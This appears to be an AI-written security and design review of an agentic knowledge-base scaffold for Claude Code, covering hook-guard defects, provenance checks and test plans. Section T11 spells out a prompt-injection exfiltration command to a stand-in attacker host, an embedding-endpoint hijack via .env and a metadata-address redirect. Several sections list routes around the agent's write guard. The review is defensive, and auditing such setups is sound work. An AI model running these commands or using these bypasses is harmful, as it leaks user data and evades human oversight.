# Deep review: agentic knowledge-base scaffold (repo at 3806dc2)

Reviewer: Fable 5.2, 2026-11-13. Repo was not modified. Everything marked CONFIRMED was reproduced in a temp copy (`scratchpad/fable_t/kb`, a 10k-note copy for timing) or read verbatim in the Claude Code docs at code.claude.com on this date. SUSPECTED means I reasoned it from code or docs but did not see it happen.

Three limits on this review:
- No live Claude Code session was run. `claude` is not on PATH on this machine (`where claude` finds nothing), so hook behaviour is verified by feeding hook JSON to `guard.py` / `capture.py` and by the docs, not by a real session.
- `scratchpad/experiments/` (case 1-3 corpora, answer keys, runs) does not exist any more, so the experimental critique rests on `docs/experiments.md`, the semantic benchmark files and `STATE.md`.
- Semantic search was reviewed by code and by the stored benchmark results; I did not re-run the embedding benchmark.

## Verdict

A+ is the right design and should be kept. The decisive weaknesses are not in the design but in three places where the implementation does not deliver what the docs claim:

1. Several flows fail or deadlock in real Claude Code (same-day owner statements, stale guard violations, background subagents, the PowerShell tool, init-kb editing `tools/`).
2. The roots of trust are model-written. "Frozen" sources, owner quotes and observed output are typed by the agent, so the deterministic quote check proves self-consistency, not truth. The reviewer and the commit order are pure model compliance.
3. Nothing in v4 or v4.1 has been run by an agent, and no hook has ever fired in a test. The README's evidence describes v1-v3.

None of this needs a redesign. It needs about a dozen targeted changes, listed in section 7.

---

## 1. End-to-end correctness in real Claude Code

### 1.1 Blocking defects

**F1. A second owner statement on the same day breaks the KB, and can break it permanently. CONFIRMED.**
- `note` step 2 and `fix` step 1 say: append the owner's words to `sources/user/<today>-session.md` (`.claude/skills/note/SKILL.md:6`, `fix/SKILL.md:5`).
- The guard blocks that append with the Edit tool: `BLOCKED (main -> sources/user/2026-11-13-session.md): sources/ is immutable evidence` (`guard.py:65`).
- If the agent appends with Bash instead (`echo x >> sources/user/...` passes the pre-check, exit 0), `kb.py check` fails: `source edited after it was frozen`.
- If that change is committed anyway (nothing gates the commit), every later check fails for ever: `source was modified in a past commit (sources are immutable)` (`kb.py:344`). There is no way out short of rewriting git history.
- The protocol demands a commit after every filing, so the second "remember this" of a day always hits this.
- Fix: one file per statement (`sources/user/<date>-<hhmmss>.md`), written by code (see T1), and replace the "any past M commit" rule with an explicit accepted-exceptions list.

**F2. A restored guard violation later blocks the librarian for ever. CONFIRMED.**
- Reproduced: main changes `notes/api-beta.md` through a script, the post-hook records it, main restores it, `kb.py check` is clean. Later the librarian legitimately edits the same note, and check fails with `changed by role 'main' which may not write it`.
- Cause: `violations.json` entries are never removed once the file matches again (`kb.py:349-363`, `guard.py:175-179`). Only the owner's `guard.py clear` removes them.
- Fix: in `guard_violations()`, drop an entry as soon as the file's hash equals the recorded one; record the offending hash, and fail only while the file still has that hash.

**F3. Subagents now start in the background by default, which the guard's design does not survive. CONFIRMED in docs, SUSPECTED in effect.**
- Docs (sub-agents page): "With nothing configured, a subagent that Claude spawns from your main conversation starts in the background." In interactive sessions, letting Claude wait requires `CLAUDE_CODE_FORK_SUBAGENT` set to `0`. `CLAUDE.md:23` says "run them in the foreground and wait", which the model may not be able to do.
- While the librarian writes, any Bash command by the main agent runs the post-hook, sees the librarian's new files against the old manifest, and records them as violations by `main` (`guard.py:160-183`). The message then tells the agent to `git checkout --` them, which destroys the librarian's work.
- The same happens if `SubagentStop` does not fire (interrupt, crash, turn limit), because that event is the only thing that refreshes the manifest.
- Fix: refresh the manifest from the librarian's and toolsmith's own PostToolUse (add `Write|Edit` to the PostToolUse matcher, and in `post()` call `write_manifest` for those roles instead of `return 0`). Also set `"env": {"CLAUDE_CODE_FORK_SUBAGENT": "0"}` in settings and test whether waiting then works.

**F4. The PowerShell tool is outside the guard and the permission rules. CONFIRMED.**
- Docs (hooks page): "The matcher `Bash|PowerShell` covers the PowerShell tool as well as Bash." The template's matchers are `Write|Edit|MultiEdit|NotebookEdit|Bash` and `Bash` (`settings.json:31,50,69`).
- Docs (permissions page): PowerShell has its own rules, `PowerShell(...)`. The template's allow list has only `Bash(...)` rules, and the deny rule `Bash(Get-Content .env*)` is written for the wrong tool.
- Effect on Windows, where the owner works: `Set-Content notes/a.md` is neither pre-checked nor post-checked, and every `uv run tools/kb.py` call through PowerShell prompts.
- Fix: add `PowerShell` to all three tool matchers and mirror the allow and deny rules. `guard.py` already knows the cmdlet names.

**F5. init-kb tells the main agent to edit files the guard forbids. CONFIRMED.**
- `init-kb/SKILL.md:22` ("Add them to `TYPES` in `tools/kb.py`") and `:25` ("add their correction phrases to `PHRASES` in `tools/hooks/capture.py`"). The guard returns exit 2 for main writing either file.
- Fix: move `TYPES`, `REVIEW_DAYS`, `PHRASES` and the thresholds into an owner-owned config file outside `tools/` (for example `kb.toml`). This also makes `tools/` replaceable on upgrade (section 6).

**F6. "Fails closed" is not true for the hook itself. CONFIRMED in docs.**
- Docs: "Non-blocking error: your hook exits with any other code, or fails in some other way, such as not starting... The action goes ahead." A timed-out PreToolUse hook also does not block. So a missing or slow `uv` silently disables the guard.
- Docs offer `"onFailure": "block"` (v2.1.295 or later). Add it to the PreToolUse hook.
- Add a heartbeat: the pre-hook touches `.git/kb-guard/heartbeat`; `kb.py check`, when run under Claude Code, fails if the heartbeat is older than a minute. Because check is itself a Bash call, the hook must just have fired. This also closes the test-harness blind spot: a harness without hooks would fail check.

### 1.2 Instructions that contradict the code, or point at things that do not exist

| # | Finding | Evidence | Status |
|---|---|---|---|
| F7 | Ingest step 1 has the model "copy" a source with the Write tool. There is no freeze tool for local files and no PDF importer, though `docs/design.md:37` describes `kb import`. | `ingest/SKILL.md:9`; `tools/` holds only kb, kbsem, fetch | CONFIRMED |
| F8 | `verify` misses new notes in a new subfolder: `git status --porcelain` prints `?? notes/sub/`, so `changed_notes()` finds nothing and prints "no changed notes" while `precheck` says review required. | reproduced; `kb.py:491-497` | CONFIRMED |
| F9 | The template's `eval/golden.md` header line is parsed as a query by `search-eval` ("1 queries ... R@5 0.00"). | reproduced; `kb.py:940-950` | CONFIRMED |
| F10 | The reviewer writes `meta/audits/<date>-review.md`. A second filing that day overwrites the first review. | `reviewer.md:24` | CONFIRMED by reading |
| F11 | `fix` steps 6-7 write `meta/errata.md` and `eval/golden.md` after the commit in step 4, leaving a dirty tree with no commit step. | `fix/SKILL.md:8-11` | CONFIRMED by reading |
| F12 | init-kb says agent changes need a session restart. Docs: agent files are picked up "within a few seconds... no restart needed", except the first file in a new directory. | `init-kb/SKILL.md:32` | CONFIRMED in docs |
| F13 | SessionStart matcher lacks `fork` (docs list `startup, resume, clear, compact, fork`). | `settings.json:107` | CONFIRMED in docs |
| F14 | `ingest` step 9 uses `git -C <KB> status`, which the allow rule `Bash(git status:*)` does not match, so it prompts. | `ingest/SKILL.md:17` | SUSPECTED |
| F15 | Subagents load `CLAUDE.md` (docs: custom subagents load it "unless you set `omitClaudeMd`"). The librarian therefore reads the main agent's protocol ("spawn them with the Agent tool", "commit"). Its own file says do not commit; a weak model gets both. | `CLAUDE.md:23,39` vs `librarian.md:45` | SUSPECTED effect |

### 1.3 What I checked and found correct

- Exec-form hooks with `args` and `${CLAUDE_PROJECT_DIR}` are real ("A command hook runs as exec form when `args` is set").
- `agent_type` is present inside subagents for tool events, and equals the agent name.
- `SubagentStop` matchers accept custom agent names.
- `Stop` and `UserPromptSubmit` have no matcher and accept `{"decision":"block","reason":...}`.
- `Bash(x:*)` is valid and equals `Bash(x *)`; compound commands are split, so `git add -A && git commit` is covered.
- `Edit(/CLAUDE.md)` is relative to the project; `ask` rules are evaluated before `allow` and before the mode.
- `Agent` is the current tool name (`Task` is an alias).
- A hook exit 2 "stops the tool call before permission rules are evaluated", so the guard beats the allow list.

### 1.4 Guard false positives (they will push users to disable it)

All CONFIRMED by running `guard.py pre` as role main. Each of these harmless commands is blocked:

- `uv run tools/kb.py search "touch points"` and `... search "how do we mv containers"` (a write word in the query plus the string `tools/`)
- `uv run tools/kb.py check 2>&1 | tee work/check.txt`
- `mkdir -p work/q && uv run tools/fetch.py ...`
- `uv run tools/kb.py log-request brief work/q.sql && rm work/tmp.csv`
- `mv data/old.csv data/archive/old.csv` (any `/archive/`, `/notes/`, `/history/` path segment counts as protected)
- `cp notes/vendor-x.md work/scratch.md` and `python -c "print(open('notes/a.md').read())"` (reads)
- `git add -A && git commit -m "kb: refactor mv carriers into notes/carriers/"`
- `grep -c src notes/*.md && touch work/done`

The pre-check is a regex over a shell string and cannot be made right. The post-check is the real protection. Recommendation: reduce the Bash pre-check to redirect targets and the mutating `kb.py` verbs, and let the manifest comparison do the rest. That removes almost all false positives without losing a guarantee, because every bypass of the regex already lands in the post-check.

`capture.py` false positives, CONFIRMED: "don't forget to run the tests before you commit", "actually, use the other csv file" and "please always sort the output for this report" each block the stop once. Words like `don't`, `always`, `never`, `actually`, `instead of` are ordinary task language. Suggest requiring either an explicit marker (`remember`, `from now on`, `that's wrong`, `no,` at the start) or two signals, and using `additionalContext` at prompt time ("this looks like a correction; file it or say none durable") instead of a blocked stop.

---

## 2. Truth maintenance

### 2.1 What is deterministic today, and what is not

| Guarantee | Enforced by | Real strength |
|---|---|---|
| A quoted string occurs in the cited source | `check_evidence` | Deterministic, but the source file is model-written (T1), the quote may sit in frontmatter, and the locator is ignored |
| Numbers in a claim occur in a quote | `numbers()` | Deterministic for digits only. `since/as of/per/from <date>` stamps are exempt (`kb.py:104`), units and entities are not compared |
| Non-numeric claims have evidence | - | **Nothing.** `[src: id]` with no quote passes |
| Changed or removed claims leave history | `removed_claims_without_history` | Only relative to HEAD, only for claim text (citations ignored), and history itself is unprotected |
| Only the librarian writes notes | guard pre + post | Holds for Write/Edit and Bash; not for PowerShell, MCP tools, background timing (F3, F4) |
| Sources are immutable | guard + git status | Only once committed; before the first commit anything goes |
| Every filing is reviewed before commit | prose | **Model compliance only** |
| Reviewer verdict is honoured, max 2 rounds, blocked claims leave notes | prose | Model compliance only |
| Trust tiers, conflict rule | prose | Model compliance only; tier is chosen by the agent that freezes the source |
| Owner's words are the owner's words | prose | Model compliance only: the agent types the file that the check reads |

### 2.2 Concrete failure and attack scenarios

**T1. The roots of trust are typed by the model. CONFIRMED by reading.**
- Local sources: ingest has the agent re-type a transcript or PDF into `sources/` with the Write tool. A weak model will abridge, normalise or "tidy". Every later quote check then verifies against the model's version.
- Owner statements: the agent writes `sources/user/...` and then cites it. A hallucinated owner quote passes check by construction.
- Observed output: the agent writes `sources/files/<today>-<slug>.md` by hand, claiming it is command output.
- Fix (highest value in this section): three small deterministic freezers.
  - `kb.py freeze <path> --type --tier`: byte copy plus frontmatter plus hash, no model in the loop. Add a PDF/Office converter.
  - `kb.py freeze --run "<command>"`: runs the command and stores the real output.
  - The UserPromptSubmit hook writes every owner prompt verbatim to `sources/user/<timestamp>.md` (or to a prompt log that `check` reads). Then `[src: user ...]` quotes are checked against text the model never touched. The hook already receives `prompt`.

**T2. A fabricated non-numeric claim passes check with no quote. CONFIRMED.**
`- Vendor Zed was acquired by Initech and the contract is cancelled. [src: 2026-09-29-email-policy]` passed. Names, decisions, negations and ownership are as consequential as numbers. Require a quote on every citation.

**T3. Wrong entity, wrong unit and an invented date pass check. CONFIRMED.**
`- API Delta is limited to 4,000 req/min since 2031-05-05. [src: ... "The batch API Alpha is limited to 4,000 req/s"]` passed: the source is about API Alpha, says per second, and has no such date. Cheap deterministic flags for the reviewer's pack (warnings, not failures):
- capitalised or title words of the claim that occur neither in the quote nor in the 250 characters around it ("ENTITY NOT IN EVIDENCE: Delta");
- the token after each number differs between claim and quote ("UNIT DIFFERS: req/min vs req/s");
- a stamp date that occurs nowhere in the source ("DATE NOT IN SOURCE").

**T4. A changed citation is invisible to both history and the reviewer. CONFIRMED.**
I swapped a claim's quote for another passage. `check` raised no history problem, and `verify` printed `0 new/changed claim(s)` because both compare `norm()`, which strips citations (`kb.py:91-94`, `:519`). Evidence can be weakened or swapped (tier 1 to tier 4) without the reviewer seeing it. Compare the full bullet for `verify`; keep the citation-blind comparison only for the history rule.

**T5. Moving a claim to another note skips review. CONFIRMED.**
I moved "API Alpha is limited to 4,000 req/s" into the API Beta note. `precheck` said `review: skip (pure moves - same content, new paths)`, and check was clean. The claim now reads as a fact about Beta (the embedding even prefixes the Beta title). `precheck` compares a bag of lines across all files (`kb.py:547-552`). Compare per file: a move is pure only if each file body at HEAD equals one current file body.

**T6. History is not append-only. CONFIRMED.**
After committing a supersede, deleting `history/api-alpha.md` raised no check problem. Check only asks whether claims in HEAD notes survive; history entries at HEAD may vanish. Add: every history entry at HEAD must still exist, unless its note id is in an uncommitted purge line.

**T7. Committing early silently skips the reviewer. CONFIRMED by reading.**
`verify` and `precheck` look only at uncommitted change. If the agent commits after the librarian (a likely Haiku slip, and the main agent holds `git commit` permission), `precheck` reports "no change", and the review never happens. Symmetrically, two filings without a commit in between escape the history rule. See S2 for the fix.

**T8. Freshness is wrong in both directions. CONFIRMED.**
- False stale: "Vendor Zed is our supplier since 2020-03-01", cited from a 2026-09-29 source, is STALE on the day it is filed, because a `since` stamp is read as a verification date (`kb.py:570-573`). Every answer then carries "may be outdated" and, per `ask` step 3, appends another line to `meta/open-questions.md`.
- False fresh: one `last_verified` on the note refreshes every claim in it (`kb.py:596-597`), checked or not. A stamp in the future (`from 2027-01-01`) makes a claim fresh for years.
- Fix: freshness = the latest of an `as of` stamp, the cited source's date and a per-claim verification mark. `since`/`from` are validity starts and say nothing about freshness.

**T9. Open disputes never close. CONFIRMED by reading.**
Any line with `[[id]]` in `open-questions.md` or `parking.md` makes search print OPEN for that note (`kb.py:826-834`). No skill removes or closes a line, and `ask` adds lines. After a few months every popular note is flagged and the flag carries no information.

**T10. The forget flow leaks what it forgets. CONFIRMED.**
- Step 3 searches for the "distinctive words" to prove they are gone. A search with no results appends the query to `meta/search-misses.log` (`kb.py:841-846`), a tracked file. Reproduced: `2026-11-13	secretprojectname zanzibar merger`.
- The content also survives in places step 3 never looks: `inbox/processed/` (the original candidate with its quote), `meta/log.md` ("short claim"), `meta/audits/*-review.md` (claim column), `meta/errata.md`, `reports/`.
- Fix: a `kb.py forget-check "<words>"` that greps the whole working tree and does not log, and a rule that the librarian redacts those files in the same filing.

**T11. Prompt injection has two pre-approved exfiltration channels. CONFIRMED by reading.**
- `Bash(uv run tools/fetch.py:*)` is allowed without a prompt. An injected page can get `uv run tools/fetch.py "https://attacker.example/?d=<note text>" --slug x` run with no approval. `docs/design.md:78` says the research session "cannot send anything anywhere"; that is not what the settings implement.
- `.env` is writable by every role (guard exit 0 for Write and for `echo ... > .env`), and `kbsem._read` takes `KB_EMBED_URL` from it. One injected write points embeddings at an attacker's host; the next `kb.py search` or `index` (both pre-approved) sends queries and note text there.
- Fixes: read embedding config only from outside the repo (`~/.config/akb/env`, OS environment), or protect `.env` in the guard and print the endpoint host whenever it changes. For `fetch.py`: refuse long query strings by default, log every URL to `meta/fetch.log`, and move the allow rule to `ask` for hosts not in an owner-approved list.
- `fetch.py` also does not re-validate redirects, so a public URL that redirects to `http://169.254.169.254/` or localhost defeats `safe_url` (`fetch.py:17-29,48`). SUSPECTED, not exercised.

**T12. The librarian is the most exposed and the most privileged role. CONFIRMED.**
It reads candidate text (which carries source quotes), has unrestricted Bash, and is exempt from both guard checks: `echo x > tools/kb.py` and `guard.py clear` both return exit 0 for role librarian (`guard.py:90,162`). When it stops, the manifest accepts whatever it did. Limit the librarian's Bash to `kb.py`, `git status/diff` and moves inside `inbox/`, and keep `tools/` and the guard state protected for it too.

**T13. Tier laundering. SUSPECTED.**
The tier is whatever the freezing agent passes (`--tier`, free text, `fetch.py:36`). A page that calls itself official documentation gets tier 2. Nothing in `check` reads tiers, so "tier 4 never sole source" is prose. Derive the tier from an owner-owned host map (default 4), and have `check` warn on numeric claims whose only citations are tier 3-4.

### 2.3 Structural changes I recommend (in order)

**S1. Deterministic provenance roots** (T1). Without this, every other check rests on text the model wrote.

**S2. A review ledger that gates the commit.** `kb.py precheck` computes a digest of the uncommitted change to notes/history/archive. A `SubagentStop` hook for `reviewer` records `{digest, verdict}` (parsed from the review file the reviewer wrote) in `.git/kb-guard/approvals.json`. The guard's pre-check on any `git commit` refuses unless `kb.py check` is clean and the current digest is approved or is a pure move. This turns "every filing is reviewed" from prose into a gate, makes early commits impossible, and costs about 60 lines.

**S3. Transactional verbs instead of free editing plus after-the-fact checks.** `kb.py supersede <note> "<old text prefix>" --new "..." --reason changed` writes the history entry, the stamp and the `History:` line itself; likewise `merge-cite`, `add-claim`, `forget`. Case 3 saw 4 of 6 history entries; a command gets 6 of 6 by construction, and the librarian's instructions shrink. The post-hoc check stays as the backstop.

**S4. Claim ids, assigned by those verbs.** A short suffix such as `^c7f3a` per bullet. It gives history a stable link (`supersedes: c7f3a`), lets conflicts and verification marks attach to a claim instead of a note, and makes citation swaps and cross-note moves visible. I would not ask a weak model to maintain ids by hand; only the verbs write them.

**S5. A conflict register in place of free-text open questions.** `meta/conflicts.tsv`: claim ids, both sources, status open or resolved, date. `kb.py conflict open|resolve`. Search derives OPEN from open rows only (fixes T9), and audit lists rows older than N days.

**S6. Canary claims to measure the reviewer.** `kb.py verify` inserts one synthetic claim that passes `check` but is wrong (a real new claim with the entity swapped for another note's title, or a unit changed). The ledger accepts an approval only if the review flagged the canary. This is the only cheap way to know, on every filing, whether the reviewer actually read the evidence. It also gives a running catch-rate statistic per model.

**S7. Sampling re-verification at audit time**, stratified by age, tier and volatility, with a stronger model than the one that filed. Record a per-claim `verified` date (needs S4). This replaces the note-level `last_verified`.

A full provenance graph or a different citation model is not worth it at this scale. S1-S3 give most of the gain.

---

## 3. Instruction load and compliance

### 3.1 What each role reads (characters / roughly tokens)

| Task | Main agent | Librarian | Reviewer |
|---|---|---|---|
| Capture one note | CLAUDE.md 5.2k + note 1.7k + charter 1.8k+ + CONVENTIONS 3.0k ≈ 3k tokens | CLAUDE.md 5.2k + librarian.md 5.7k + charter + CONVENTIONS + `index.md` ≈ 4k tokens + index | CLAUDE.md + reviewer.md 2.4k + charter + verify pack ≈ 2.5k tokens + pack |
| Ingest | + ingest 3.1k | same | same |
| Fix | + fix 3.0k, later ask 1.8k for the regression agent | same | same |

`index.md` is the scaling problem. The librarian is told to read it first on every call (`librarian.md:14`). It grows about 58 bytes per note: 581 KB at 10,000 notes (measured), 58 KB or roughly 15k tokens at 1,000. Drop it from "read first"; search and `similar` do that job.

### 3.2 Rules that will be ignored in practice

- **Protocol ordering** (precheck, reviewer, max two rounds, blocked claims out, commit last). It is six steps across three agents and now possibly across turns (F3). Move to S2 plus a `kb.py next` command that prints the single next step from the actual state (inbox, diff, ledger). A weak model follows "run `kb.py next` and do what it says" far better than a remembered protocol.
- **"Restate the evidence before comparing"** (reviewer). Unobservable, so it will be skipped. S6 measures the outcome instead.
- **Two search phrasings plus `similar` before filing** (librarian step 3). Fold into one command, `kb.py dupcheck "<claim>"`, that runs all three.
- **Structure check after every filing** (librarian step 5). Have `kb.py index` print the hints so the librarian sees them without a separate step.
- **`last_verified` only after re-checking**, **never rewrite a note**, **tier rules**, **"none durable"**: all prose. The first and third can be warnings in code; the second is covered by the history rule.
- **Log lines** (`meta/log.md`, verdict lines, moving files to `processed/`): bookkeeping a command should do (`kb.py verdict <file> <item> <verdict>`).

The librarian file carries about forty separate obligations. Everything that is bookkeeping should become a verb; what remains (cold read, admission test, merge or supersede or conflict) is the judgement the role exists for.

### 3.3 Things to delete

- The "Rationalizations" tables were tuned on Haiku. They are fine there, but with Sonnet- or Opus-class models emphatic "ALL mean REJECT" language tends to cause over-rejection, and case 1 already recorded a durable rule that never reached the notes. Measure recall of durable facts per model (section 5) before keeping them for all models.
- `MultiEdit` in the matcher (legacy tool).
- The duplicated filing protocol in `ingest`, `note`, `fix`, `research` and `refactor`. Keep one copy, or better `kb.py next`.

### 3.4 Is the agent split right?

Yes for librarian and reviewer: their value is context isolation (a cold reader, a fresh checker), and that cannot be had in one context. The toolsmith is rarely used and cheap to keep. The researcher is thin (six lines) but is the right isolation boundary for untrusted web text; it should lose access it does not need (it can currently read all notes and run the pre-approved fetch). I would not add agents. The main agent is the overloaded one, and the cure is code (S2, S3, `kb.py next`), not another role.

---

## 4. Code review

### kb.py
- T2-T8 above (evidence, history, precheck, verify, freshness).
- `source_problems()` scans the whole git log on every check and makes one past modification fatal for ever (F1). Line-ending normalisation of an old source would trigger it too.
- `source_ids()` maps stem to path; two sources with the same stem in different subfolders silently shadow each other (`kb.py:113`).
- `parse()`: a summary starting with `[` becomes a list (`summary: [Draft] process`); ` #` in a title truncates it.
- `check --inbox` checks every pending file, including other agents' and `blocked:` ones, so "until clean for your file" needs a path argument.
- `search-misses.log` is tracked and written by every search, including the reviewer's and regression agents' searches, so alias-gap hints are polluted and every commit carries log noise. Move it to `.git/kb-guard/` or ignore it.
- Performance, measured on 10,000 notes / 50,000 claims / 200 sources (Windows, warm cache): `check` 8 s (44 s cold), `search` 1.8 s, `similar` 2.3 s, `stats` 2.9 s, `index` 2.4 s, `precheck` 4.3 s, `verify` of one claim 5.6 s, guard post-hook 0.63 s per Bash call. All usable. `verify` rebuilds the similar pool per claim, so a 30-claim filing takes minutes; build the pool once.
- Semantic search at that size: the pure-Python dot product is fine (about 1 s for 60k vectors of 1,024 dimensions, measured), but `Store.vectors` loads every vector as a Python list, about 2 GB at 60k x 1,024 and 5 GB for Qwen3-4B's 2,560 dimensions. Keep `array('f')` and score in chunks.
- The lead gate is measured in standard deviations of the whole score distribution, which depends on corpus size and on how many sibling notes exist. A margin calibrated at 140 notes will not hold at 2,000, and "one note per entity" produces many near-twins whose leads are small exactly for entity-specific questions. Recalibrate automatically when the unit count has grown by half.
- The canary check runs only in `embed`, never in `index`, which is what the librarian runs.

### guard.py
- F2, F3, F4, T12 and the false positives in 1.4.
- `SessionStart` (including `compact`) and `clear` accept the current state wholesale. Combined with F4 this launders anything written outside the Bash tool. With S2 this matters less, because the gate moves to the commit.
- `.claude/` (agents, skills), `CONVENTIONS.md`, `meta/purges.tsv`, `eval/golden.md`, `redirects.tsv` and `.env` are unprotected against Bash (all exit 0, CONFIRMED). `charter.md` and `CLAUDE.md` are protected only for the Edit tool; `sed -i ... charter.md` passes. Add the owner-owned files to the manifest.
- Per-call cost is about 0.35 s for each of pre and post (measured), which is acceptable.

### capture.py
- False positives in 1.4. The flag file is overwritten by each matching prompt and only the last one is remembered.
- `written_since` treats any write under `inbox/` as "filed", including an unrelated candidate.
- Better use of the same hook: S1 (log the owner's words verbatim).

### kbsem.py
- T11 (`.env` endpoint). A non-local `http://` URL with a key sends the key in clear text; warn.
- `_redact` covers one key; error bodies (`e.read()[:200]`) may echo input text into the agent's context.

### fetch.py
- T11 (pre-approved channel, redirects). `--tier` is unvalidated text. The page title goes into frontmatter with only quotes replaced.
- `sha256` is written and never checked by anything.
- Exact-quote matching against trafilatura markdown is brittle: emphasis marks and table pipes sit inside the text, so a faithful quote of "4,000 req/s" fails against `**4,000** req/s`. Weak models then shorten quotes until they match, which weakens evidence. Normalise `* _ | \`` on both sides in `wsnorm`.

### create_kb.py and new-kb scripts
- Sound. The tar filter and `filter="data"` are right. Missing: a scaffold version stamp and file manifest (section 6). `new-kb.sh` does not handle a missing git identity the way `create_kb.py` does.

---

## 5. Experimental validity

### 5.1 What the evidence does and does not support

- **Nothing after v3 has been run by an agent.** `docs/experiments.md:67` says so for v4; v4.1 adds search. The README's evidence section reads as if it described the current scaffold.
- **Hooks never fired.** The statement "in real Claude Code they enforce what the experiments measured from diffs" (`experiments.md:64`) is unverified, and F1-F6 show parts of it are false.
- **Fix-and-retest on the same corpus.** Case 3 reports "PASS after 2 fixes". A pass after tuning on the test is not a pass; it needs a held-out corpus.
- **Ceiling effect.** Q&A accuracy was about 97% for every variant, with 30 questions and two replicates. Differences of half a question are noise. The right reading is "this metric cannot separate the variants", not "gating costs no accuracy".
- **No recall metric.** "0 planted noise" measures precision against a planted list. How many of the 167 durable facts in case 3 reached the notes is not reported. Case 1 already saw one durable rule lost to `needs-context`. Over-rejection is the gated design's characteristic failure and it is unmeasured.
- **Reviewer value has no denominator.** "Caught 6, 4 and 3 majors" says nothing about how many errors it missed or how many flags were false.
- **Haiku only, scripted owner.** The scaffold is tuned to Haiku's failures. A scripted owner answers every question perfectly and never contradicts themselves, changes their mind or ignores the agent.
- **Semantic benchmark.** Notes and most queries came from one model. Negatives are 45. The gate was chosen on the queries it is reported on. Zero false hints out of 45 bounds the true rate only below about 6.5% (95%), and 1 of 45 has an interval of roughly 0.1% to 12%. The two settings are statistically indistinguishable on false hints, while the recall difference is 15 versus 7 rescued answers of 120. The KB had 140 notes, and the lead statistic depends on corpus size.

### 5.2 Conclusions I think are wrong or too strong

1. "Fails closed" (README, guard docstring): only for malformed input, not for a hook that cannot start or times out.
2. "One-off scripts stay free outside the protected folders": the pre-check blocks many harmless commands (1.4).
3. "The research session cannot send anything anywhere": T11.
4. "0/45 false hits" as a property of margin 1.3: it is a fit to 45 samples.
5. "Fixed deterministically" for history: true for text edits against HEAD, not for citation changes, history deletion or uncommitted sequences (T4, T6, T7).

### 5.3 The open question: what should the semantic gate optimise?

Recall, under a loose bound on false pointers. Reasons:

- A false pointer costs one note read and a small chance of a wrong answer, which the same-entity rule in `ask` is meant to stop. A miss costs a false "not in KB", which is also an accuracy failure, and it drives re-research and duplicate filing.
- At filing time (`similar`), a miss is the expensive error: an undetected duplicate or conflict is silent corruption, while a false neighbour is a labelled line the librarian dismisses. The benchmark shows the strict gate adds almost nothing there (duplicates 10/12 either way).
- The evidence cannot distinguish 0/45 from 1/45, but it can distinguish the recall (Dutch 13/15 versus 10/15, rescued answers 15 versus 7).

Concretely:
1. Keep 0.6 as the default for `search`. Change `--calibrate` to pick the smallest margin whose false-pointer rate is at most 5% (at least 40 negatives), not zero.
2. For `similar`, drop the lead rule and always show the top three vector neighbours next to the word-overlap hits.
3. Print semantic-only hits in a separate block ("found by meaning only - open and confirm the entity"), at most two, with the query terms that do not occur in the note.
4. Measure what matters: the wrong-answer rate of a real agent on no-answer questions with and without semantic hits (case B below). Pointer rate is a proxy.

### 5.4 The next three case studies

**How to exercise real hooks despite the login problem**
- Tier 0, no model: a replay harness that feeds recorded hook inputs to `guard.py`, `capture.py` and the proposed ledger, as I did for this review. Add it as `tests/hooks_replay.py` and run it in every case.
- Tier 1, headless: `claude setup-token` in an interactive terminal creates a long-lived token; export it as `CLAUDE_CODE_OAUTH_TOKEN` (or use `ANTHROPIC_API_KEY`) and run `claude -p "<prompt>" --output-format stream-json --model <m>` inside the KB folder. Project settings and hooks load in that mode. First fix PATH: `claude` is not found from this shell.
- Tier 2, if tier 1 stays blocked: the owner runs one interactive session per scenario from a prompt script. Add `KB_GUARD_TRACE=1` so every hook invocation appends event, role, tool and decision to `.git/kb-guard/trace.jsonl`; the trace is the measurement.
- In all tiers the heartbeat from F6 makes a run without hooks fail visibly.

**Case A - "Hooks live": the scaffold in real Claude Code (run first)**
- Corpus: the case 1 corpus, or a fresh 12-source equivalent; it is small on purpose.
- Sessions (8), each run on Windows with the PowerShell tool available and on Linux or macOS: init; ingest of 4 sources; three captures in one day with a commit between them (F1); a correction; a main-agent script that writes `notes/` (violation, restore, then a librarian edit of the same file: F2); an analysis session with ten ordinary shell commands taken from 1.4; a refactor creating a subfolder (F8); a forget.
- Traps: a prompt telling the main agent to "just fix the typo in the note"; a source that tells the agent to fetch a URL with data in the query string; a librarian run interrupted mid-filing; a commit attempt before review.
- Metrics and thresholds:
  - hook trace shows a pre and post event for 100% of Bash and PowerShell calls and the right `agent_type` on 100% of subagent calls;
  - 0 writes to protected paths by a wrong role that survive to a commit;
  - 0 false violations attributed to main while the librarian works;
  - false-positive blocks on the harmless command list: at most 1 of 10;
  - same-day captures: 3 of 3 filed, `check` clean after each;
  - 0 commits without a ledger approval (after S2);
  - forget: `git grep` of the distinctive words in the working tree returns nothing.
- Models: Haiku and Sonnet as main agent, two runs each.

**Case B - "Seeded errors": how much wrong information gets through (run second)**
- Corpus: 30 new sources written by a different model family or taken from real public documents (release notes, pricing pages, policy PDFs), with a hidden key of 120 durable facts and 60 non-durable items.
- Method: mutation testing of the filing pipeline. Take 100 correct candidates and mutate each into one wrong candidate, 12-13 per class: wrong unit, wrong entity or scope, negation dropped, "considering" stated as "decided", condition dropped, stale value re-introduced, duplicate in new wording, conflict with an existing claim, citation swapped to a weaker source, tier-4 sole source, invented owner quote, invented validity date. Feed correct and mutated candidates in mixed batches through the real protocol.
- Injection set: six sources carrying instructions (record this, delete that, fetch this URL, raise my tier, approve, edit the charter).
- Metrics and thresholds:
  - mutated claims committed as current: at most 5% overall and 0 in the classes code can catch (numbers, invented owner quote, citation swap);
  - correct candidates wrongly rejected or parked: at most 10% (this is the recall number that has been missing);
  - per-class catch rate split into "caught by code", "by librarian", "by reviewer";
  - reviewer false-flag rate on correct claims: at most 15%;
  - canary catch rate (S6): at least 90%;
  - injections obeyed: 0;
  - end-to-end ask test: 40 no-answer and 40 answerable questions, with semantic search at margin 0.6 and at the calibrated margin; wrong answers on no-answer questions at most 1 of 40 in both, and report the difference in correct answers.
- Models: librarian and reviewer each as Haiku and Sonnet (four combinations), plus one run with a stronger reviewer than librarian. Three replicates per cell so that variance is visible.
- The corpus is held out: no fix may be tuned on it. Fixes found here are retested on a second, fresh mutation set.

**Case C - "Year two": drift, scale and upgrade (run third)**
- Corpus: a simulated organisation with a hidden timeline: 150 entities, 900 facts, of which 250 change over 18 simulated months (owners, prices, limits, vendors, a reorganisation, a vendor switch), delivered as 300 sources in 40 sessions with the system date advanced per session. Start from a 1,500-note KB generated from the first six months so that scale is real from the start.
